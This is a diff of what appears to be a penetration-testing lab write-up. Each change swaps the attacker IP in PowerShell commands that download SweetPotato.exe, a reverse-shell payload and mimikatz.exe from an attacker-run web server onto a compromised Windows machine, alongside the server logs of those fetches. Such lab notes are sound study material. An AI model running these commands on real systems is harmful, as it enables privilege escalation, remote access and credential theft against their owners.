@@ -900,7 +900,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.123.101 - - [24/Apr/2024 11:03:37] "GET /SweetPotato.exe HTTP/1.1" 200 -
 
-PS C:\Users\lisa> iwr -uri http://192.168.49.123:80/SweetPotato.exe -Outfile SweetPotato.exe
+PS C:\Users\lisa> iwr -uri http://192.168.49.108:80/SweetPotato.exe -Outfile SweetPotato.exe
 
 ```
 
@@ -922,7 +922,7 @@ Saved as: r.exe
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.123.101 - - [24/Apr/2024 11:04:52] "GET /r.exe HTTP/1.1" 200 -
 
-PS C:\Users\lisa> iwr -uri http://192.168.49.123:80/r.exe -Outfile r.exe
+PS C:\Users\lisa> iwr -uri http://192.168.49.108:80/r.exe -Outfile r.exe
 ```
 
 ![[Pasted image 20240425011408.png]]
@@ -1211,7 +1211,7 @@ Ethernet adapter Ethernet0:
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.123.102 - - [24/Apr/2024 12:16:23] "GET /mimikatz.exe HTTP/1.1" 200 -
 
-PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.49.123:80/mimikatz.exe -Outfile mimikatz.exe
+PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.49.108:80/mimikatz.exe -Outfile mimikatz.exe
 
 ```
 
